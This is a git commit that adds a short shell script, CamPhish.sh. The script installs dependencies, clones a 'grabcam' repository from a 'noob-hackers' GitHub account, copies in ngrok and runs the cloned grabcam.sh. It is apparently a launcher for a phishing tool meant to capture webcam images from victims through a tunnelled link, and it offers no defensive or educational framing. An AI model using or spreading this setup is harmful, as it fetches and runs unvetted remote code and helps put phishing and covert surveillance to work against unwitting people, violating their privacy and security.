24b31c319f5d7ea3873f10c4aa7b7cf9bda94d7a
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-09-02 13:39:04 +0530

    Create CamPhish.sh
    B

---
+++ CamPhish.sh
@@ -0,0 +1,14 @@
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/noob-hackers/grabcam
+mv grabcam $HOME
+cd $HOME
+cp ngrok $HOME/grabcam
+ls
+cd grabcam
+ls
+bash grabcam.sh
